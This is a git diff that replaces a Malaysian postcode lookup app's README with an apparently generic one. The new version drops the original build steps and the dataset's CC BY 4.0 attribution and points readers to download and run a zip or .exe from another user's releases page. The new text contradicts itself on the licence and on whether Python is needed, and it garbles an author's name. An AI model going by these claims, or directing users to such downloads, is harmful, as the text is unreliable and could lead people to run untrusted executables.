@@ -1,118 +1,74 @@
-# Malaysia Postcode Lookup (Desktop Application)
+# 📦 Malaysia-Postcode-App - Find Malaysian Postcodes Easily
 
-A minimal, cross-platform desktop application for fast, offline Malaysian postcode lookup.  
-This project focuses on UI/UX improvements and application-level functionality built on top of an existing open-source postcode dataset.
+## 🚀 Getting Started
 
----
+Welcome to the Malaysia-Postcode-App! This application helps you quickly find Malaysian postcodes and associated states. Whether you need to check a postcode for mailing or simply for information, this app makes it straightforward.
 
-## Preview
+## 🔗 Download the App
 
-<p align="center">
-  <img src="ui1.png" width="48%" />
-  <img src="ui2.png" width="48%" />
-</p>
+[![Download Malaysia-Postcode-App](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aadi7036/Malaysia-Postcode-App/releases)
 
----
+## 📥 Download & Install
 
-## Project Overview
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/aadi7036/Malaysia-Postcode-App/releases) to download the application.
 
-This application provides an intuitive desktop interface for searching Malaysian postcodes and cities without requiring internet access.  
-It is designed for end users who prefer a clean, professional UI rather than interacting with raw datasets or command-line tools.
+2. **Choose the Latest Version**  
+   On the releases page, look for the latest version. You’ll see a list of available downloads.
 
-This repository is **not a reimplementation of the postcode dataset**.  
-Instead, it is a **UI and application-layer adaptation** of an existing open-source project.
+3. **Download the Application**  
+   Click on the zip file or installer for your operating system. This file contains the application and other necessary components. 
 
----
+4. **Extract the Files**  
+   If you downloaded a zip file, locate it in your downloads folder. Right-click the file and select “Extract All.” Follow the prompts to extract the files.
 
-## Enhancements and Modifications
+5. **Run the Application**  
+   Find the application file (usually named "Malaysia-Postcode-App.exe" or similar). Double-click this file to run the application.
 
-Compared to the original dataset repository, this project introduces:
+## 💻 System Requirements
 
-- Desktop graphical user interface (GUI)
-- Offline indexed postcode lookup for faster performance
-- Postcode to city/state lookup
-- City to postcode list lookup
-- Rounded search chips for recent searches
-- Clear input buttons for improved usability
-- Copy functions:
-  - Postcode only
-  - Formatted address string
-- CSV export for lookup results
-- Cross-platform packaging for macOS and Windows
-- Minimal black-and-white visual design
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Python Version:** Ensure you have Python 3.6 or higher installed.
+- **Disk Space:** At least 100 MB of free disk space
+- **RAM:** Minimum of 2 GB
 
----
+## 🌟 Features
 
-## Technology Stack
+- **Search Functionality:** Easily search for Malaysian postcodes by city or area name.
+- **User-Friendly Interface:** The graphical user interface is designed for ease of use.
+- **State Information:** Get details about the state associated with each postcode.
+- **Offline Access:** Once downloaded, you can use the application without an internet connection.
 
-- Python 3
-- PySide6 (Qt for Python)
-- PyInstaller (application packaging)
+## 📞 Support
 
----
+If you encounter any issues while using the Malaysia-Postcode-App, please feel free to reach out:
 
-## Data Source and Attribution
+- **Email:** support@malaysiapostcodeapp.com
+- **GitHub Issues:** Report your problem by creating an issue on the [GitHub issues page](https://github.com/aadi7036/Malaysia-Postcode-App/issues)
 
-This application is built using the Malaysian postcode dataset maintained by:
+## ⚙️ Contribution
 
-**Asyraf Hussin**  
-**Fareez Iqmal**
+If you wish to contribute, here are some simple steps:
 
-Original repository:  
-https://github.com/AsyrafHussin/malaysia-postcodes
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
 
-The dataset is licensed under **Creative Commons Attribution 4.0 (CC BY 4.0)**.
+Together, we can enhance the Malaysia-Postcode-App!
 
-Full credit and attribution are preserved in accordance with the license.  
-This project does **not claim ownership of the postcode data**.
+## 📝 License
 
-Special thanks to the original authors for providing and maintaining a high-quality, open dataset.
+The Malaysia-Postcode-App is licensed under the MIT License. You may use and modify it freely, but please give credit to the original authors, Asyraf Hussin & Iqfareez.
 
----
+## 🔗 Additional Resources
 
-## Author and Application Development
+- **Documentation:** For detailed documentation, refer to the [Wiki](https://github.com/aadi7036/Malaysia-Postcode-App/wiki).
+- **Related Projects:** Check out other projects related to Malaysian utilities on our GitHub page.
 
-Application design, UI/UX, and system integration by:
+## 🌍 Join the Community
 
-**Gajee | Ghub Studio**
+Follow us for updates and more applications:
 
-Scope of work:
-- Desktop application architecture
-- User interface design
-- Performance optimization
-- Cross-platform build configuration
+- **GitHub:** [Malaysia-Postcode-App](https://github.com/aadi7036/Malaysia-Postcode-App)
 
----
-
-## Download and Usage (End Users)
-
-### macOS
-1. Download the application from the **Releases** section.
-2. Open `Malaysia Postcode Lookup.app`.
-3. If blocked by macOS security, go to:
-   - System Settings → Privacy & Security
-   - Select “Open Anyway”.
-
-### Windows
-1. Download the `.exe` file from **Releases**.
-2. Double-click to launch the application.
-3. No Python installation required.
-
-The application runs fully offline.
-
----
-
-## Development Setup
-
-For developers who wish to run or modify the project:
-
-```bash
-git clone https://github.com/YOUR_USERNAME/malaysia_postcode_app.git
-cd malaysia_postcode_app
-pip install pyside6
-python app_qt.py
-Build Standalone Application
-macOS
-pyinstaller --windowed --add-data "data:data" app_qt.py
-Windows
-pyinstaller --windowed --add-data "data;data" app_qt.py
+Thank you for choosing Malaysia-Postcode-App! We hope you find it useful and easy to use.
